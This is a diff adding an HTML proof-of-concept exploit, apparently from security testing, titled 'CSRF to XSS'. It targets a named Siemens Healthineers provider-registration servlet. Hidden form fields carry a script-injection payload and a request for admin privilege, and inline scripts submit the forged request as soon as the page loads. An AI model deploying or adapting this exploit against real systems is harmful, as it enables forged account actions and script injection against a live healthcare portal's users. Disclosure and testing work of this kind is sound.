@@ -1,0 +1,66 @@
+<html>
+  <!-- CSRF to XSS - TVM -->
+  <body>
+    <form name=tvm2 action="https://consult.siemens-healthineers.com/public/PublicServlet" method="POST">
+      <input type="hidden" name="service" value="SAVE&#95;USER" />
+      <input type="hidden" name="boardCertified" value="on" />
+      <input type="hidden" name="boardQualified" value="on" />
+      <input type="hidden" name="city" value="San&#32;Francisco" />
+      <input type="hidden" name="designation" value="DC" />
+      <input type="hidden" name="email" value="testing&#64;example&#46;com" />
+      <input type="hidden" name="existingOrg" value="the" />
+      <input type="hidden" name="firstName" value="aYlNlfdX" />
+      <input type="hidden" name="ignoreDuplicateProvider" value="false" />
+      <input type="hidden" name="lastName" value="aYlNlfdX" />
+      <input type="hidden" name="locAddress" value="3137&#32;Laguna&#32;Street" />
+      <input type="hidden" name="locCity" value="San&#32;Francisco" />
+      <input type="hidden" name="locEmail" value="testing&#64;example&#46;com" />
+      <input type="hidden" name="locFax" value="317&#45;317&#45;3137" />
+      <input type="hidden" name="locNPI" value="1" />
+      <input type="hidden" name="locPhone" value="555&#45;666&#45;0606" />
+      <input type="hidden" name="locPracticeName" value="aYlNlfdX" />
+      <input type="hidden" name="locState" value="AL" />
+      <input type="hidden" name="locTin" value="1" />
+      <input type="hidden" name="locZip" value="94102" />
+      <input type="hidden" name="locationLatitude" value="1" />
+      <input type="hidden" name="locationLongitude" value="1" />
+      <input type="hidden" name="mailingAddress" value="testing&#64;example&#46;com" />
+      <input type="hidden" name="npi" value="1" />
+      <input type="hidden" name="org" value="JOIN" />
+      <input type="hidden" name="orgAddress" value="3137&#32;Laguna&#32;Street" />
+      <input type="hidden" name="orgCity" value="San&#32;Francisco" />
+      <input type="hidden" name="orgEmail" value="testing&#64;example&#46;com" />
+      <input type="hidden" name="orgFax" value="317&#45;317&#45;3137" />
+      <input type="hidden" name="orgKey" value="aYlNlfdX" />
+      <input type="hidden" name="orgNPI" value="1" />
+      <input type="hidden" name="orgName" value="aYlNlfdX" />
+      <input type="hidden" name="orgPhone" value="555&#45;666&#45;0606" />
+      <input type="hidden" name="orgState" value="AL" />
+      <input type="hidden" name="orgTin" value="1" />
+      <input type="hidden" name="orgType" value="REF" />
+      <input type="hidden" name="orgZip" value="94102" />
+      <input type="hidden" name="org&#95;Type" value="aYlNlfdX" />
+      <input type="hidden" name="password" value="u&#93;H&#91;ww6KrA9F&#46;x&#45;F" />
+      <input type="hidden" name="phone" value="555&#45;666&#45;0606" />
+      <input type="hidden" name="physicianSpecialty" value="150" />
+      <input type="hidden" name="radSubspecialties" value="10" />
+      <input type="hidden" name="rad&#95;subspecialties" value="aYlNlfdX&apos;&quot;&#40;&#41;&amp;&#37;&lt;zzz&gt;&lt;ScRiPt&#32;&gt;alert&#40;9994&#41;&lt;&#47;ScRiPt&gt;" />
+      <input type="hidden" name="requestAdminPriv" value="on" />
+      <input type="hidden" name="resultIdentifiers" value="1" />
+      <input type="hidden" name="result&#95;identifiers" value="aYlNlfdX" />
+      <input type="hidden" name="sameAsAbove0" value="on" />
+      <input type="hidden" name="sameAsAbove1" value="on" />
+      <input type="hidden" name="state" value="AL" />
+      <input type="hidden" name="tin" value="1" />
+      <input type="hidden" name="userName" value="aYlNlfdX" />
+      <input type="hidden" name="userType" value="PROVIDER" />
+      <input type="hidden" name="zip" value="94102" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+<script type="text/javascript">document.tvm2.submit()</script>
+  </body>
+</html>
